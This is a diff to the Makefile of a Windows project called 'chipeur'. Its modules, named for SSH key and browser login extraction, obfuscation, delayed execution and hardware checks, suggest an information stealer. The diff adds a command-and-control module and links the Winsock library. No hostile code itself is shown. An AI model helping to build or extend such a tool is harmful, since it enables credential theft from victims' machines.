@@ -4,7 +4,7 @@ INCLUDE_DIR = include/
 OBJ_DIR = obj/
 
 # add the object file used here
-OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)hardware_requirements.o $(OBJ_DIR)delay_execution.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o
+OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)hardware_requirements.o $(OBJ_DIR)delay_execution.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o $(OBJ_DIR)c2.o
 
 CC=x86_64-w64-mingw32-gcc
 CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
@@ -12,7 +12,7 @@ CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-deref
 
 #not needed for now
 LDFLAGS =# -Wl,--strip-all
-LLIB= -luuid -lole32 -lcrypt32
+LLIB= -luuid -lole32 -lcrypt32 -lws2_32
 DEBUG=-DDEBUG
 
 .PHONY : all help clean
@@ -25,6 +25,9 @@ all: chipeur.exe
 
 #Create the object files
 $(OBJ_DIR)chipeur.o: $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h $(INCLUDE_DIR)find_ssh_key.h
+	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
+
+$(OBJ_DIR)c2.o: $(SRC_DIR)c2.c $(INCLUDE_DIR)c2.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 $(OBJ_DIR)find_ssh_key.o : $(SRC_DIR)find_ssh_key.c $(INCLUDE_DIR)find_ssh_key.h $(INCLUDE_DIR)extract_file.h
